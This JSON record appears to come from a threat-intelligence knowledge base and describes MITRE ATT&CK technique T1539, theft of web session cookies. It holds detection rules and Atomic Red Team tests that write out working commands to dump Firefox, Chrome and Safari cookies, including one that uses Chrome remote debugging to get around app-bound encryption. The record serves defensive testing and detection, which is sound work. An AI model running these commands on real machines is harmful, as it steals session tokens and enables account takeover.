{
    "id": "T1539",
    "name": "Steal Web Session Cookie",
    "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](T1550.004) technique to login to the corresponding web application.",
    "platforms": "Linux, macOS, Windows, Office 365, SaaS, Google Workspace",
    "kill_chain_phases": "Credential Access",
    "data_sources": "File: File Access, Process: Process Access",
    "detection": "Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.",
    "url": "https://attack.mitre.org/techniques/T1539",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "4b1c186d-8bf2-4297-9cbc-f8f00192770b",
                    "24c77512-782b-448a-8950-eddb0785fc71",
                    "4833155a-4053-4c9c-a997-777fcea0baa7",
                    "10ffac09-e42d-4f56-ab20-db94c67d76ff"
                ],
                "lookup_results": [
                    {
                        "uuid": "4b1c186d-8bf2-4297-9cbc-f8f00192770b",
                        "lookup_data": {
                            "description": "Prynt Stealer Spotted In the Wild - A New Info Stealer Performing Clipper And Keylogger Activities",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/4b1c186d-8bf2-4297-9cbc-f8f00192770b.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1666601854",
                            "uuid": "4b1c186d-8bf2-4297-9cbc-f8f00192770b",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "24c77512-782b-448a-8950-eddb0785fc71",
                        "lookup_data": {
                            "description": "Detect usage of the \"sqlite\" binary to query databases in Chromium-based browsers for potential data stealing.",
                            "raw": "author: TropChaud\ndate: 2022/12/19\ndescription: Detect usage of the \"sqlite\" binary to query databases in Chromium-based\n  browsers for potential data stealing.\ndetection:\n  condition: all of selection_*\n  selection_chromium:\n    CommandLine|contains:\n    - \\User Data\\\n    - \\Opera Software\\\n    - \\ChromiumViewer\\\n  selection_data:\n    CommandLine|contains:\n    - Login Data\n    - Cookies\n    - Web Data\n    - History\n    - Bookmarks\n  selection_sql:\n  - Product: SQLite\n  - Image|endswith:\n    - \\sqlite.exe\n    - \\sqlite3.exe\nfalsepositives:\n- Unknown\nid: 24c77512-782b-448a-8950-eddb0785fc71\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/84d9edaaaa2c5511144521b0e4af726d1c7276ce/atomics/T1539/T1539.md#atomic-test-2---steal-chrome-cookies-windows\n- https://blog.cyble.com/2022/04/21/prynt-stealer-a-new-info-stealer-performing-clipper-and-keylogger-activities/\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1539\n- attack.t1555.003\n- attack.collection\n- attack.t1005\ntitle: SQLite Chromium Profile Data DB Access\n",
                            "sigma:id": "24c77512-782b-448a-8950-eddb0785fc71",
                            "title": "SQLite Chromium Profile Data DB Access",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4833155a-4053-4c9c-a997-777fcea0baa7",
                        "lookup_data": {
                            "description": "Detect usage of the \"sqlite\" binary to query databases in Firefox and other Gecko-based browsers for potential data stealing.",
                            "raw": "author: frack113\ndate: 2022/04/08\ndescription: Detect usage of the \"sqlite\" binary to query databases in Firefox and\n  other Gecko-based browsers for potential data stealing.\ndetection:\n  condition: all of selection_*\n  selection_firefox:\n    CommandLine|contains:\n    - cookies.sqlite\n    - places.sqlite\n  selection_sql:\n  - Product: SQLite\n  - Image|endswith:\n    - \\sqlite.exe\n    - \\sqlite3.exe\nfalsepositives:\n- Unknown\nid: 4833155a-4053-4c9c-a997-777fcea0baa7\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1539/T1539.md#atomic-test-1---steal-firefox-cookies-windows\n- https://blog.cyble.com/2022/04/21/prynt-stealer-a-new-info-stealer-performing-clipper-and-keylogger-activities/\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1539\n- attack.collection\n- attack.t1005\ntitle: SQLite Firefox Profile Data DB Access\n",
                            "sigma:id": "4833155a-4053-4c9c-a997-777fcea0baa7",
                            "title": "SQLite Firefox Profile Data DB Access",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "10ffac09-e42d-4f56-ab20-db94c67d76ff",
                        "lookup_data": {
                            "mitre-attack-id": "T1539",
                            "mitre-cti:description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                            "mitre-cti:name": "Steal Web Session Cookie",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows', 'Office 365', 'SaaS', 'Google Workspace'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Microsoft Threat Intelligence Center (MSTIC)', 'Johann Rehberger'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff', 'type': 'attack-pattern', 'created': '2019-10-08T20:04:35.508Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1539', 'url': 'https://attack.mitre.org/techniques/T1539'}, {'description': 'Rehberger, J. (2018, December). Pivot to the Cloud using Pass the Cookie. Retrieved April 5, 2019.', 'url': 'https://wunderwuzzi23.github.io/blog/passthecookie.html', 'source_name': 'Pass The Cookie'}, {'source_name': 'Kaspersky TajMahal April 2019', 'url': 'https://securelist.com/project-tajmahal/90240/', 'description': 'GReAT. (2019, April 10). Project TajMahal – a sophisticated new APT framework. Retrieved October 14, 2019.'}, {'source_name': 'Unit 42 Mac Crypto Cookies January 2019', 'url': 'https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/', 'description': 'Chen, Y., Hu, W., Xu, Z., et. al. (2019, January 31). Mac Malware Steals Cryptocurrency Exchanges’ Cookies. Retrieved October 14, 2019.'}, {'description': 'Gretzky, Kuba. (2019, April 10). Retrieved October 8, 2019.', 'url': 'https://github.com/kgretzky/evilginx2', 'source_name': 'Github evilginx2'}, {'source_name': 'GitHub Mauraena', 'url': 'https://github.com/muraenateam/muraena', 'description': 'Orrù, M., Trotta, G.. (2019, September 11). Muraena. Retrieved October 14, 2019.'}], 'modified': '2021-07-28T01:26:51.971Z', 'name': 'Steal Web Session Cookie', 'description': 'An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\\n\\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\\n\\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\\n\\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.', 'x_mitre_version': '1.2', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['File: File Access', 'Process: Process Access'], 'x_mitre_permissions_required': ['User'], 'x_mitre_is_subtechnique': False}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1539",
                "display_name": "Steal Web Session Cookie",
                "atomic_tests": [
                    {
                        "name": "Steal Firefox Cookies (Windows)",
                        "auto_generated_guid": "4b437357-f4e9-4c84-9fa6-9bcee6f826aa",
                        "description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "sqlite3_path": {
                                "description": "Path to sqlite3",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
                            },
                            "output_file": {
                                "description": "Filepath to output cookies",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Sqlite3 must exist at (#{sqlite3_path})\n",
                                "prereq_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force\n"
                            }
                        ],
                        "executor": {
                            "command": "stop-process -name \"firefox\" -force -erroraction silentlycontinue\n$CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"\n\"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c #{sqlite3_path} \"$CookieDBLocation\" | out-file -filepath \"#{output_file}\"\n",
                            "cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Steal Chrome Cookies (Windows)",
                        "auto_generated_guid": "26a6b840-4943-4965-8df5-ef1f9a282440",
                        "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "cookie_db": {
                                "description": "Filepath for Chrome cookies database",
                                "type": "string",
                                "default": "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
                            },
                            "sqlite3_path": {
                                "description": "Path to sqlite3",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
                            },
                            "output_file": {
                                "description": "Filepath to output cookies",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Sqlite3 must exist at (#{sqlite3_path})\n",
                                "prereq_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force\n"
                            }
                        ],
                        "executor": {
                            "command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue\n\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c #{sqlite3_path} \"#{cookie_db}\" | out-file -filepath \"#{output_file}\"\n",
                            "cleanup_command": "remove-item #{output_file}\n",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Steal Chrome Cookies via Remote Debugging (Mac)",
                        "auto_generated_guid": "e43cfdaf-3fb8-4a45-8de0-7eee8741d072",
                        "description": "The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.\n\nIf successful, this test will output a list of cookies.\n\nNote: Chrome processes will be killed during this test.\n\nSee https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e",
                        "supported_platforms": [
                            "macos"
                        ],
                        "dependency_executor_name": "bash",
                        "dependencies": [
                            {
                                "description": "Install Go",
                                "prereq_command": "go version",
                                "get_prereq_command": "brew install go"
                            },
                            {
                                "description": "Download and compile WhiteChocolateMacademiaNut",
                                "prereq_command": "/tmp/WhiteChocolateMacademiaNut/chocolate -h",
                                "get_prereq_command": "git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut\ncd /tmp/WhiteChocolateMacademiaNut\ngo mod init chocolate\ngo mod tidy\ngo build"
                            }
                        ],
                        "executor": {
                            "command": "killall 'Google Chrome'\nsleep 1\nopen -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\nsleep 1\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337",
                            "cleanup_command": "rm -rf /tmp/WhiteChocolateMacademiaNut",
                            "name": "bash",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Steal Chrome v127+ cookies via Remote Debugging (Windows)",
                        "auto_generated_guid": "b647f4ee-88de-40ac-9419-f17fac9489a7",
                        "description": "Chrome v127+ uses app-bound encryption to protect cookies. This test bypasses that protection to obtain the cookies. If successful, the test outputs cookie values to the console.\nNote: Will stop any instances of Chrome already running\nAdapted from https://embracethered.com/blog/posts/2024/cookie-theft-in-2024-and-what-todo",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "$devToolsPort = 9222\n$testUrl = \"https://www.google.com\"\nstop-process -name \"chrome\" -force -erroraction silentlycontinue\n$chromeProcess = Start-Process \"chrome.exe\" \"$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default\" -PassThru\nStart-Sleep 10\n$jsonResponse = Invoke-WebRequest \"http://localhost:$devToolsPort/json\" -UseBasicParsing\n$devToolsPages = ConvertFrom-Json $jsonResponse.Content\n$ws_url = $devToolsPages[0].webSocketDebuggerUrl\n$ws = New-Object System.Net.WebSockets.ClientWebSocket\n$uri = New-Object System.Uri($ws_url)\n$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()\n$GET_ALL_COOKIES_REQUEST = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}'\n$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)\n$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length\n$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()\n$completeMessage = New-Object System.Text.StringBuilder\ndo {\n    $receivedBuffer = New-Object byte[] 2048\n    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length\n    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result\n    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)\n    $completeMessage.Append($receivedString)\n} while (-not $result.EndOfMessage)\n$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, \"Closing\", [System.Threading.CancellationToken]::None).Wait()\ntry {\n    $response = ConvertFrom-Json $completeMessage.ToString()\n    $cookies = $response.result.cookies\n} catch {\n    Write-Host \"Error parsing JSON data.\"\n}\nWrite-Host $cookies\nStop-Process $chromeProcess -Force",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Copy Safari BinaryCookies files using AppleScript",
                        "auto_generated_guid": "e57ba07b-3a33-40cd-a892-748273b9b49a",
                        "description": "This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.\n",
                        "supported_platforms": [
                            "macos"
                        ],
                        "input_arguments": {
                            "destination_path": {
                                "description": "Specify the path to copy the BinaryCookies file into.",
                                "type": "path",
                                "default": "/private/tmp"
                            }
                        },
                        "executor": {
                            "command": "osascript -e 'tell application \"Finder\"' -e 'set destinationFolderPath to POSIX file \"#{destination_path}\"' -e 'set safariFolder to ((path to library folder from user domain as text) & \"Containers:com.apple.Safari:Data:Library:Cookies:\")' -e 'duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",
                            "cleanup_command": "rm \"#{destination_path}/Cookies.binarycookies\"",
                            "name": "sh",
                            "elevation_required": false
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 15:09:57"
}